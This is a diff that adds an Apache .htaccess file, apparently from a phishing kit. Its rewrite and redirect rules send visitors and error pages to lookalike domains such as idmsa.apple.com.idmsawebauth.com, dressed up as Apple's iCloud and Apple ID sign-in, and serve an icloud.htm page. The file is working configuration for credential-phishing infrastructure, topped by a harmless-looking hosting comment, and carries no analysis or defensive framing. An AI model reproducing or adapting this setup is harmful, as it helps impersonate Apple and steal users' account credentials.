@@ -1,0 +1,13 @@
+# Do not remove this line or mod_rewrite rules and search engine friendly URLs will stop working
+
+DirectoryIndex / icloud.htm
+
+RewriteEngine on
+RewriteBase /
+DirectoryIndex http://icloud.apple.idmsawebauth.com/
+ErrorDocument 404 http://icloud.apple.idmsawebauth.com
+
+RewriteCond %{HTTP_HOST} ^icloud\.apple\.idmsawebauth\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.icloud\.apple\.idmsawebauth\.com$
+RewriteRule ^/?$ "http\:\/\/idmsa\.apple\.com\.idmsawebauth\.com\/\?appIdKey\=45571f444c4f547116bfd052461b0b3ab1b2b445a72138157ea8c5c82fed62" [R=301,L]
+
